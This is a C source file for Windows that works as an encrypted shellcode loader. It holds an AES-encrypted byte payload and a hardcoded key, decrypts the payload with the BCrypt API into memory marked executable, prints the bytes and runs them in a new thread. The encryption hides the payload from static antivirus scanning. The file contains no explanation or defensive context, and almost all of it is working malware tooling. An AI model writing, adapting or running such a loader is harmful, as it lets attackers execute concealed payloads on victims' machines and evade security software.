# include <stdio.h>
# include <windows.h>
# include <bcrypt.h>
# include <dbghelp.h>
# include <ntstatus.h>

# pragma comment (lib, "bcrypt.lib")

# pragma comment (lib, "crypt32.lib")


//static const BYTE buf[] = { 0xd1,0x1f,0x68,0x54,0x0a,0x4f,0x02,0x9a,0xb3,0x36,0xba,0x48,0x4f,0xf0,0xb1,0xda,0x07,0xfe,0x45,0xc1,0xae,0xca,0x32,0x2d,0xad,0xeb,0x2e,0xfc,0xa8,0xef,0x0d,0xe8,0xa1,0x94,0x92,0x93,0x7e,0x28,0x98,0xf8,0x77,0xee,0xf5,0xd9,0x56,0xe6,0xfd,0x0a,0x54,0x7e,0x1a,0xd3,0x6b,0x0a,0x83,0x6c,0xc5,0x11,0x02,0xc0,0xcf,0x45,0x45,0x39,0xdf,0x84,0xf0,0x75,0x78,0x5f,0xb1,0x40,0xfd,0x1d,0x07,0x32,0x7b,0xa6,0x7c,0x88,0x96,0xb0,0x7e,0x56,0xf1,0xd3,0x04,0xa4,0xf1,0xf2,0x31,0x28,0xb3,0x7e,0x7d,0xae,0x80,0xf8,0x3c,0xa8,0x99,0x5b,0x51,0x42,0xc9,0x63,0xb2,0xa0,0x25,0x61,0xdb,0xc3,0xb5,0xda,0x60,0x28,0x36,0xec,0x56,0x90,0x4d,0xd6,0xc8,0x23,0xcf,0xdd,0x29,0xc8,0x6a,0x81,0x51,0xca,0xb9,0x9d,0xcb,0x31,0x7d,0xa5,0x1e,0x84,0xb2,0x7a,0xed,0x7e,0x14,0x09,0x7f,0xb2,0x30,0xe8,0x4e,0xd9,0x0d,0x70,0x72,0xbe,0x1c,0xc3,0xf3,0x0c,0x82,0x5e,0x90,0x95,0x34,0x4a,0xa1,0x2f,0x0b,0x9c,0xc8,0xe1,0x5d,0x66,0x5c,0x93,0xcd,0x87,0xb3,0xd6,0xe4,0x94,0xf0,0x2d,0x35,0x2f,0xba,0x86,0x9b,0x77,0x4b,0x80,0xd3,0x4d,0x38,0xad,0x2f,0x73,0xb2,0x31,0x01,0x38,0x6b,0x01,0xdb,0x85,0xba,0xcd,0xb4,0x7e,0x27,0x1e,0x43,0xaa,0x97,0xa8,0x7a,0xfd,0xe0,0xf9,0xfe,0x8d,0x5b,0x09,0x95,0x6c,0xd9,0xc0,0xae,0x00,0xc7,0x62,0x90,0x28,0x6e,0x05,0xf6,0x9f,0xe1,0xc1,0x7d,0x37,0xf5,0x38,0x60,0x3c,0x07,0x35,0xea,0x54,0xea,0x0a,0xe2,0xe8,0x2b,0x7a,0x31,0x33,0xef,0x60,0x71,0x1e,0xa4,0xb3,0xb8,0x0d,0x99,0xaf,0x1f,0xc2,0xf4,0xaa,0x43,0xa7,0x03,0xf4,0xc8,0x42,0xf4,0x10,0x67,0x04,0x8a,0x39,0xac,0x1a,0x3b,0xf0,0xad,0x3c,0xbf,0x18,0x31,0xdd,0x37,0x47,0x04,0x0f,0xad,0xea,0x3b,0x87,0x4a,0xcf,0xb5,0x08,0xbb,0xed,0x83,0x5f,0xe4,0x74,0xc4,0x8a,0xa7,0x7b,0xb5,0xf6,0x7a,0x54,0xe9,0x03,0x25,0x40,0xfa,0x5b,0x33,0x7b,0x05,0x13,0x68,0x09,0xa9,0x0f,0xfe,0x23 };
static const BYTE keyss[] = { 0x4b,0x44,0x42,0x4d,0x01,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x68,0x65,0x6c,0x6c,0x6f,0x69,0x73,0x73,0x73,0x73,0x73,0x73,0x73,0x73,0x73,0x73 };

static const BYTE buf[] = { 0x5a,0xec,0x08,0x95,0x17,0xa6,0x80,0x40,0xce,0xa0,0x6d,0x81,0x38,0xd7,0x59,0x7a,0x20,0xb5,0x37,0x8e,0xb1,0xaa,0x3a,0x7b,0xf1,0x3c,0xd1,0x71,0x2b,0x1c,0x3e,0x84,0x01,0x5d,0x35,0xbe,0x9d,0xe4,0xd3,0x6d,0x39,0xbe,0xef,0x1d,0x32,0xcc,0x22,0xe2,0x94,0xd8,0xd8,0x2f,0xc9,0x9b,0x79,0x23,0xc7,0x41,0xdd,0x9d,0x63,0xa8,0x04,0xc7,0x02,0x40,0x5b,0xc3,0x53,0x6d,0x29,0x2a,0xfc,0x4c,0xe1,0xea,0x91,0x15,0xdc,0xfb,0xb8,0xeb,0x7c,0x22,0x92,0xed,0xce,0x74,0x99,0x5e,0xd0,0x4c,0xee,0x99,0xb3,0x6d,0xfd,0xca,0x63,0x0d,0x8c,0x48,0x0d,0x21,0x2f,0x6a,0x1c,0x5b,0x4f,0x9e,0x4f,0x44,0xe6,0x7b,0x69,0x9a,0x44,0x23,0x6d,0xdc,0x65,0x73,0x52,0x27,0x81,0xca,0x9b,0xe3,0x20,0x77,0x4a,0x85,0x33,0xf9,0xf3,0x6c,0x08,0x33,0x3d,0xb7,0x37,0x00,0x95,0xc2,0x42,0x3d,0x43,0x4d,0x4d,0x2f,0x88,0xd0,0x4e,0x41,0x12,0x32,0x81,0x87,0x0f,0x9a,0x1e,0x85,0x22,0x08,0x71,0x88,0xef,0xeb,0xe2,0x19,0xb8,0x41,0x14,0x05,0x65,0xb5,0xe7,0xf0,0x5c,0xba,0xd7,0xc6,0x94,0xa3,0x06,0xd0,0xa6,0x28,0xd2,0x33,0x18,0xd9,0x19,0x3c,0xe1,0xfd,0x1e,0xaa,0xbd,0x51,0xac,0xb2,0xc9,0xfb,0xe4,0x48,0xa0,0x9d,0x88,0x1a,0xbb,0xc1,0x5d,0xad,0xa3,0xc7,0x67,0xc1,0xde,0x6c,0x7a,0x94,0x40,0xc4,0x6b,0xdc,0xcb,0x34,0x2c,0x7c,0xc5,0xce,0x4a,0x8b,0x80,0x4f,0xb2,0xbf,0x35,0x7f,0xb1,0x2e,0x98,0xc8,0x36,0x3d,0xd1,0xa3,0x96,0x2b,0xef,0x7a,0x5d,0xea,0xcf,0xd3,0x61,0x37,0x65,0x98,0x0e,0x7d,0x83,0x65,0x52,0x21,0xa6,0xd9,0xbb,0x11,0x23,0x41,0x51,0x67,0x0b,0x30,0x92,0xa4,0x83,0x5a,0x16,0x7e,0x4c,0x71,0xf1,0x90,0x2e,0xe7,0x9e,0x84,0x98,0x65,0x53,0x7b,0x53,0x29,0x52,0x05,0xeb,0x7c,0x95,0x09,0x52,0x41,0x8d,0xc4,0xcd,0x36,0x02,0x49,0xdf,0x37,0xca,0x30,0xfd,0xf4,0x02,0x83,0x2c,0x26,0x92,0xe8,0x1a,0x1a,0xee,0x71,0x20,0xb9,0xfd,0x43,0xcf,0x14,0x63,0xa4,0x12,0x7f,0x0b,0x8d,0x46,0xc5,0x46,0x36,0xaf,0x60,0x74,0xb0,0x5e,0x5d,0x7d,0x38,0x31,0xe4,0x08,0x71,0x1d,0xe3,0x68,0xfd,0xc2,0x7f,0x9b,0x1f,0x62,0x1a,0xef,0xed,0xae,0x09,0x79,0x9f,0xc4,0xd6,0x69,0x65,0xd8,0x46,0xfe,0x05,0xf0,0x53,0x58,0xfd,0x11,0xcf,0x40,0x78,0x25,0x46,0x78,0x8b,0x08,0x5b,0x80,0xa6,0x01,0xdd,0x9a,0x97,0xc8,0x3f,0x08,0x24,0x71,0xd1,0x84,0x37,0x52,0x1c,0xfb,0xd5,0x43,0xfe,0xd8,0xf2,0xb0,0x22,0xf6,0x0e,0x24,0xa6,0xbb,0xfd,0xee,0x37,0xf1,0xeb,0x91,0x9e,0x18,0x67,0xb7,0x99,0x61,0xcb,0x96,0xfa,0xb3,0x70,0x90,0x51,0x0e,0x3f,0x2a,0x28,0xcb,0x26,0x8e,0xd7,0x76,0x81,0xa0,0x81,0x8e,0x68,0xdc,0x44,0x22,0x5c,0x11,0x20,0xb2,0x75,0xd1,0xc6,0xad,0xd8,0x5e,0x7d,0x05,0x60,0xcc,0x1e,0x26,0x5d,0xc4,0x9c,0xdc,0x1d,0x6e,0x83,0xa3,0x18,0x9f,0x43,0x88,0xd4,0xbb,0x0d,0x23,0xe6,0xf1,0xff,0x2d,0x20,0x08,0xcb,0x80,0x91,0xe6,0xc6,0x8a,0x3b,0xcf,0x81,0x63,0x5a,0xc5,0xc2,0x07,0xe4,0xea,0x6d,0x0c,0xf4,0x57,0xf2,0x87,0x13,0xbb,0xbe,0x6a,0x54,0xd0,0xc2,0x75,0x3d,0x12,0x7b,0x27,0xa7,0x93,0x9f,0xfa,0x26,0xae,0xbd,0xa9,0x2c,0xbc,0xc4,0x79,0xa9,0xa8,0x97,0x34,0xd5,0x67,0x92,0x9e,0xa0,0xc2,0xc7,0x67,0x10,0xad,0x12,0xf5,0x92,0x4d,0x74,0x54,0xe6,0xb6,0xa3,0xbb,0x36,0x60,0x65,0x79,0x8c,0xe8,0x33,0x08,0x9a,0x57,0xd7,0x23,0x69,0x5e,0xc1,0xa4,0xdc,0x36,0x10,0x73,0x2f,0xed,0xb2,0x72,0xb8,0xd1,0xa7,0x2a,0x78,0xb1,0xd8,0x08,0x7a,0xda,0xf1,0x1d,0xe8,0x3e,0x5c,0xf9,0x34,0x43,0x6b,0xf2,0x63,0x3b,0x1c,0x3a,0x42,0x17,0xba,0x16,0xec,0x1f,0x0a,0xb6,0xcb,0x02,0x7c,0x12,0x7d,0xb7,0x65,0x11,0xd4,0xf5,0x3a,0x81,0x3a,0x7a,0x9e,0x98,0x36,0xc6,0xa0,0x72,0xf2,0xa3,0x00,0x09,0xfe,0x97,0xc1,0x7a,0xcf,0xbb,0xba,0x56,0x7f,0x33,0x96,0x66,0x9d,0x06,0x65,0x7b,0x92,0x56,0x25,0x2f,0x14,0x6f,0xdd,0x36,0xcb,0xef,0xbf,0xee,0x31,0x63,0x74,0x86,0xdd,0xed,0x7f,0x65,0xda,0x34,0x05,0x49,0x29,0xaa,0xd0,0x62,0x76,0x40,0x07,0x1b,0xbd,0x1b,0x7b,0x46,0xce,0x12,0xa4,0xb6,0xb3,0xdd,0x37,0xd3,0x2f,0x0f,0x43,0xf9,0x51,0x94,0x33,0x43,0xd9,0xf3,0xc7,0x25,0xf8,0xc7,0x9e,0x1b,0xfa,0x04,0xeb,0x3a,0x53,0x70,0xfd,0x50,0x9c,0x59,0x1b,0x6e,0xce,0xd3,0x1a,0x95,0x0b,0xad,0xd8,0x44,0x45,0x0b,0x1f,0x1a,0x04,0x58,0x97,0x8a,0x52,0xc9,0xd5,0x6e,0x99,0x46,0x9f,0x25,0xb7,0xc3,0xcb,0x3e,0x1c,0xa2,0x67,0x60,0xbe,0xb3,0xf2,0x6e,0xcd,0xab,0x3c,0x3a,0x3f,0x13,0x68,0x27,0x46,0x43,0xe1,0x59,0x89,0x09,0x6f,0x12,0xbd,0xe7,0x6b,0x0b,0x02,0xc3,0xe1,0x46,0x2f,0x72,0x0a,0x50,0x80,0x25,0xc1,0x3c,0xd2,0x13,0x8a,0xae,0x58,0xad,0x01,0x5c,0x42,0x0a,0xcc,0xe8,0x52,0x1e,0x85,0x68,0x58,0xce,0x53,0x6c,0x4d,0xff,0x16,0x46,0x18,0x7f,0x4a,0xd2,0x72,0x0f,0x38,0x24,0x36,0xef,0xce,0x96,0x47,0x0d,0xfd,0xae,0x68,0x54,0x3d,0xfa,0x1c,0xef,0x03 };
int main() {


    BCRYPT_ALG_HANDLE phalgorithm;
    LPCWSTR pszImplementation = NULL;
    BCryptOpenAlgorithmProvider(&phalgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(phalgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    NTSTATUS status;
    BCRYPT_KEY_HANDLE phkey;
    DWORD pboutput;
    ULONG pcbresult;
    if ((status = BCryptGetProperty(phalgorithm, BCRYPT_OBJECT_LENGTH, (PUCHAR)&pboutput, sizeof(DWORD), &pcbresult, 0)) != 0) {
        printf("[+] Error Occured while Getting Key property of Algorithm: %X\n", status);
        exit(0);
    }

    LPVOID heapmemory_key_import = HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, pboutput);

    if ((status = BCryptImportKey(phalgorithm, NULL, BCRYPT_KEY_DATA_BLOB, &phkey, (PUCHAR)heapmemory_key_import, pboutput, (PUCHAR)keyss, sizeof(keyss), 0)) != 0) {
        printf("[+] Error Occured while Importing Key: %X\n", status);
        exit(0);
    }


    LPVOID heapmemory_buf = HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, sizeof(buf));
    ULONG decrypted_size;

    if ((status = BCryptDecrypt(phkey, (PUCHAR)heapmemory_buf, sizeof(buf), NULL, NULL, 0, NULL, 0, &decrypted_size, BCRYPT_BLOCK_PADDING)) != 0) {
        printf("[+] Error: %X\n", status);
        exit(0);
    }

    LPVOID heapmemory_decryptedtext = VirtualAlloc(NULL, decrypted_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ULONG pcbresult_decrypt_new;

    if ((status = BCryptDecrypt(phkey, (PUCHAR)buf, sizeof(buf), NULL, NULL, 0, (PUCHAR)heapmemory_decryptedtext, decrypted_size, &pcbresult_decrypt_new, BCRYPT_BLOCK_PADDING)) != 0) {
        printf("[+] Error: %X\n", status);
        exit(0);
    }

    printf("[+] Printing decrypted text....\n");
    for (DWORD i = 0; i < pcbresult_decrypt_new; i++) {
        printf("0x%02x,", ((PUCHAR)heapmemory_decryptedtext)[i]);
    }



    HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)heapmemory_decryptedtext, NULL, NULL, NULL);
    WaitForSingleObject(hThread, INFINITE);

    return 1;

}